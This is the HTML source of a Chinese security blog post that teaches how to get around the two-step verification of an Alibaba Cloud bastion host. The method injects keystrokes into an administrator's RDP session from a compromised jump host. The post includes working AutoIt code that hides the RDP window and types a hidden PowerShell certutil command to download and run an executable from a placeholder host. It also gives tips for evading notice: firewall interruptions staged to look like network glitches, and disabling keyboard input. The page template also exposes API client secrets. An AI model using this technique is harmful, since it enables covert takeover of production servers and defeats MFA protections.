@@ -1,0 +1,570 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="Technology Blog">
+  <meta name="author" content="MYZXCG">
+  <meta name="keywords" content="Cyber Security">
+  <title>AutoIt SendKey绕过云盾堡垒机两步验证 - MYZ&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      
+        
+          
+        
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/themes/prism.min.css" />
+      
+      
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/plugins/line-numbers/prism-line-numbers.min.css" />
+      
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"myzxcg.com","root":"/","version":"1.8.6","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"#"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":"G-RLPQJE3YTB","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"6Fu9AJHglaqmAVjpYMdOOBEi-MdYXbMMI","app_key":"0GcKEskKSnNfqn5dbNITfO4H","server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MYZ's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                
+                Blog
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                
+                Links
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/post.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="AutoIt SendKey绕过云盾堡垒机两步验证">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      MYZXCG
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-16 17:15" pubdate>
+        2021年1月16日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">AutoIt SendKey绕过云盾堡垒机两步验证</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：8 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近遇到部署了阿里云云盾堡垒机的环境。云盾堡垒机后是windows server的生产环境机器，运维通过rdp到云盾堡垒机，再去选择服务器连接。虽然有了堡垒机的账号密码，但登录云盾堡垒机需要两步验证码，又没办法获取到运维的MFA，所以无法直接登录。在这种情况下，可通过SendKey的方式，来获取线上服务器权限。</p>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/143796.html?spm=a2c4g.11186623.6.630.16a75d77mxpd7B">RDP协议运维 - 堡垒机 - 阿里云</a></p>
+<p>运维登录过程：从本机RDP到跳板机（windows server 2012 R2） ==&gt; 通过跳板机再RDP到阿里云堡垒机（输入堡垒机账号和两步验证码）==&gt; 堡垒机再走rdp协议连接到线上服务器。</p>
+<p>其中跳板机可控，目标有一个普通用户专门用来连接堡垒机。（如果运维的机器能直接rdp到堡垒机，也相当于这里的跳板机，道理是一样的）</p>
+<p>进入正题。</p>
+<h2 id="SendKey"><a href="#SendKey" class="headerlink" title="SendKey"></a>SendKey</h2><p>SendKey其实就是发送键盘指令。Windows下可以直接通过向某个窗口发送键盘指令来执行命令。例如发送WIN+R打开运行窗口，再发送cmd就会弹出cmd窗口。这个过程就像你自己在键盘上按WIN+R，打开cmd的方式一样。</p>
+<p><img src="images/image-20210116213501668.png" srcset="/img/loading.gif" alt=""></p>
+<p>推荐使用<a target="_blank" rel="noopener" href="https://www.autoitscript.com/site/">AutoIt</a>来编写SendKey的程序。除此之外还有powershell版的<a target="_blank" rel="noopener" href="https://archive.codeplex.com/?p=wasp">WASP</a>来SendKey，但是WASP不如AutoIt的可定制化程度高。</p>
+<p><strong>整体的思路是：</strong>当运维登录堡垒机时(已经连上了线上服务器，即开启了RDP窗口)，在跳板机执行AutoIt编写的exe，就会向堡垒机的RDP窗口发送键盘指令。比如发送WIN+R之后紧接着发送<code>POWERSHELL -WINDOWSTYLE HIDDEN -C &quot;CERTUTIL -URLCACHE -SPLIT -F HTTPS://xxx.com/xxx.exe C:/WINDOWS/TASKS/xxx.exe;C:/WINDOWS/TASKS/xxx.exe&quot;</code>来下载exe并执行。过程很简单，但是有很多细节和坑点需要注意，下面主要细说一下，代码在最后。</p>
+<h2 id="细节处理"><a href="#细节处理" class="headerlink" title="细节处理"></a>细节处理</h2><ol>
+<li><p>跳板机mstsc程序的键盘设置必须是在远程计算机上。这样发送组合键才会发送到rdp的窗口去。</p>
+<p><img src="images/image-20210116184509174.png" srcset="/img/loading.gif" alt=""></p>
+</li>
+<li><p>在发送指令的过程中不能被干扰，如果在SendKey的时候，RDP窗口内的聚焦不在WIN+R打开的运行窗口或cmd.exe的窗口内，那么就会输入到其他地方。并且还有最重要的一点要处理：总不能当着管理员的面WIN+R弹个框，输入一堆命令执行吧–_–</p>
+<p>这两个问题推荐两种解决方法: </p>
+<ol>
+<li>可以在发送指令的时候先隐藏这个RDP窗口(不是最小化，是直接隐藏这个窗口)，AutoIt可以实现。这样管理员无法操控和看到这个窗口，如果你有跳板机的管理员权限，甚至可以禁用键盘输入。这样更不容易影响SendKey的过程。整个过程执行完，运维看到窗口消失的时间大概3-4秒。</li>
+<li>在SendKey的过程中，可以在跳板机上添加一条防火墙，阻断目标对跳板机的连接，也就3-4秒时间，之后再给他恢复就好了。</li>
+</ol>
+<p>在有跳板机管理员权限的情况下，推荐第二种，这样可他能以为是网络波动暂时断了而已，第一种方法窗口突然消失，次数多了，风险会比较大。</p>
+</li>
+<li><p>SendKey的方式，并不是百分百成功率。</p>
+<p>某种极端情况下，例如你把运维的rdp窗口隐藏后，运维疯狂按键盘，这种是百分百失败（WIN+R那里输入的字符串会乱，但疯狂点鼠标不会有影响）。所以最好拿到跳板机的管理员权限，这样可以通过禁用键盘输入来提高成功率。再加上防火墙规则，断开连接再恢复。也不会怀疑太多。</p>
+</li>
+<li><p>阿里云堡垒机默认有录屏功能，如果目标去查看录像，就很容易被发现。</p>
+</li>
+</ol>
+<h2 id="AutoIt代码"><a href="#AutoIt代码" class="headerlink" title="AutoIt代码"></a>AutoIt代码</h2><div class="code-wrapper"><pre class="line-numbers language-ABAP" data-language="ABAP"><code class="language-ABAP">#include &lt;AutoItConstants.au3&gt;
+Local $aList &#x3D; WinList(&quot;192.168.1.1:3389 - 远程桌面连接&quot;)
+For $i &#x3D; 1 To $aList[0][0]
+   Example($aList[$i][1]))
+   sleep(8000)
+Next
+Func Example($hWnd)
+  Local $iState &#x3D; WinGetState($hWnd);判断是否是最小化
+  WinSetState($hWnd,&quot;&quot;,@SW_HIDE)
+  SendKeepActive($hWnd)
+  Send(&quot;#r&quot;)
+  sleep(800)
+  Send(&quot;&#123;DEL 2&#125;&quot;)
+  Send(&quot;&#123;SHIFTDOWN&#125;&quot;);全部大写，是为了解决输入法的问题
+  Send(&quot;&#123;SHIFTUP&#125;&quot;)
+  sleep(800)
+  Opt(&quot;SendKeyDelay&quot;, 0)
+  Send(&#39;POWERSHELL&#123;SPACE&#125;&#123;SPACE&#125;-WINDOWSTYLE&#123;SPACE&#125;&#123;SPACE&#125;HIDDEN&#123;SPACE&#125;&#123;SPACE&#125;-C&#123;SPACE&#125;&#123;SPACE&#125;&quot;CERTUTIL&#123;SPACE&#125;&#123;SPACE&#125;-URLCACHE&#123;SPACE&#125;&#123;SPACE&#125;-SPLIT&#123;SPACE&#125;&#123;SPACE&#125;-F&#123;SPACE&#125;&#123;SPACE&#125;HTTPS:&#x2F;&#x2F;XXX.com&#x2F;XXX.PNG&#123;SPACE&#125;&#123;SPACE&#125;C:&#x2F;WINDOWS&#x2F;TASKS&#x2F;XXX.EXE;C:&#x2F;WINDOWS&#x2F;TASKS&#x2F;XXX.EXE&quot;&#39;)
+  Sleep(500)
+  Send(&quot;&#123;enter&#125;&#123;enter&#125;&quot;)
+  sleep(500)
+  WinSetState($hWnd,&quot;&quot;,@SW_SHOW)
+  If BitAND($iState, $WIN_STATE_MINIMIZED) Then
+     WinSetState($hWnd,&quot;&quot;,@SW_MINIMIZE)
+  EndIf
+EndFunc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p><strong>注：</strong>其实，只要是rdp窗口的都可以通过这个方法拿权限。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/windows/">windows</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/20201215.html">
+                        <span class="hidden-mobile">Windows https流量抓取与解密</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', function () {
+        var gitalk = new Gitalk({
+          clientID: 'e0d54f3fea956b581e05',
+          clientSecret: '1afd7215dc03a3fa856eb90ad3269d4e9b28a68e',
+          repo: 'myzxcg.github.io',
+          owner: 'myzxcg',
+          admin: ["myzxcg"],
+          id: '8a54112a3611278c24def0481a520894',
+          language: 'zh-CN',
+          labels: ["Gitalk"],
+          perPage: 10,
+          pagerDirection: 'last',
+          createIssueManually: true,
+          distractionFreeMode: false
+        });
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+    
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RLPQJE3YTB"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-RLPQJE3YTB');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
